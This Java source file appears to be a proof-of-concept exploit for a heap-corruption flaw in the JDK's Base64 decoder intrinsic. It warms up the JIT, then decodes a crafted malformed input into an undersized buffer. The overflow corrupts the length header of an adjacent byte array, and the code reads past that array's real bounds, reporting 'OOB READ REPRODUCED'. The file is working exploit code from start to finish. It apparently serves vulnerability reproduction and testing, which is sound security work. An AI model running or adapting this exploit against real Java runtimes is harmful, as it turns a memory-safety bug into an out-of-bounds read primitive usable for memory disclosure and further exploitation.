import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;

/**
 * CVE-2026-114938 heap-corruption demonstration.
 *
 * Decodes malformed input into a 50-byte destination (the exact size the JDK
 * computes for the 65-byte trigger).  The intrinsic's broken tail store then
 * writes 62 bytes past that array.  A byte[] allocated immediately after the
 * destination is hit; with any luck its length field becomes a large positive
 * value, giving an out-of-bounds read primitive.
 *
 * This process deliberately corrupts its own heap.  It may crash; that is a
 * valid result.  Run it in a disposable container/JVM.
 */
public final class HeapCorruption {
    private static volatile int sink;
    private static volatile Object keep;

    public static void main(String[] args) throws Exception {
        int warmup = 200_000;
        int dstSize = 50;
        int victimSize = 64;
        int oobIndex = 4096;
        boolean showLength = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--warmup": warmup = Integer.parseInt(args[++i]); break;
                case "--dst-size": dstSize = Integer.parseInt(args[++i]); break;
                case "--victim-size": victimSize = Integer.parseInt(args[++i]); break;
                case "--oob-index": oobIndex = Integer.parseInt(args[++i]); break;
                case "--show-length": showLength = true; break;
                default:
                    System.err.println("unknown option: " + args[i]);
                    System.exit(2);
            }
        }

        boolean isJdk17 = Runtime.version().feature() <= 17;
        int aCount = isJdk17 ? 128 : 64;
        byte[] valid = repeat((byte) 'A', aCount);
        byte[] malformed = repeat((byte) 'A', aCount + 1);
        malformed[aCount] = (byte) '=';

        int decodedLen = ((malformed.length + 3) / 4) * 3 - 1;
        if (dstSize < decodedLen) {
            System.err.println("dst-size must be >= " + decodedLen);
            System.exit(2);
        }

        Base64.Decoder decoder = Base64.getDecoder();

        // Compile / intrinsify the decode path BEFORE the victim is allocated.
        byte[] warm = new byte[4096];
        for (int i = 0; i < warmup; i++) sink += decoder.decode(valid, warm);
        Arrays.fill(warm, (byte) 0);

        // Allocation order matters: dst then victim.  Both normally land in the
        // same thread-local allocation buffer, one after the other.
        byte[] dst = new byte[dstSize];
        byte[] victim = new byte[victimSize];
        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(victim, (byte) 0x41);
        keep = victim;

        sun.misc.Unsafe unsafe = unsafe();
        long base = unsafe.arrayBaseOffset(byte[].class);
        long lengthOffset = base - 4;

        int lengthBefore = unsafe.getInt(victim, lengthOffset);
        int javaLengthBefore = victim.length;

        System.out.println("runtime         = " + System.getProperty("java.runtime.version"));
        System.out.println("arrayBaseOffset = " + base);
        System.out.println("dstSize         = " + dstSize);
        System.out.println("victimSize      = " + victimSize);
        System.out.println("length before   = " + lengthBefore + " (java " + javaLengthBefore + ")");
        System.out.flush();

        boolean rejected = false;
        try {
            decoder.decode(malformed, dst);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int lengthAfter = unsafe.getInt(victim, lengthOffset);
        int javaLengthAfter = victim.length;

        System.out.println("rejected        = " + rejected);
        System.out.println("length after    = " + lengthAfter + " (java " + javaLengthAfter + ")");

        if (lengthAfter != victimSize && lengthAfter > 0) {
            System.out.println("CORRUPTED: victim length changed from " + victimSize + " to " + lengthAfter);
            if (showLength) {
                System.out.println("first 32 victim bytes = " + hex(victim, 0, Math.min(32, victim.length)));
            }

            // Bounds-check bypass: if the length is now positive and large,
            // Java will happily read past the real 64-byte allocation.
            if (lengthAfter > oobIndex) {
                try {
                    byte leaked = victim[oobIndex];
                    System.out.printf("OOB READ OK: victim[%d] = 0x%02x%n", oobIndex, leaked & 0xff);
                    System.out.println("OOB READ REPRODUCED");
                } catch (Throwable t) {
                    System.out.println("OOB read failed: " + t);
                }
            }
        } else {
            System.out.println("victim header not usefully corrupted (length=" + lengthAfter + ")");
        }

        // Do not let the GC walk a deliberately smashed object.
        System.out.flush();
        Runtime.getRuntime().halt(0);
    }

    private static byte[] repeat(byte value, int count) {
        byte[] out = new byte[count];
        Arrays.fill(out, value);
        return out;
    }

    private static String hex(byte[] data, int from, int to) {
        StringBuilder sb = new StringBuilder();
        for (int i = from; i < to; i++) sb.append(String.format("%02x ", data[i] & 0xff));
        return sb.toString();
    }

    private static sun.misc.Unsafe unsafe() throws Exception {
        Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        return (sun.misc.Unsafe) f.get(null);
    }
}
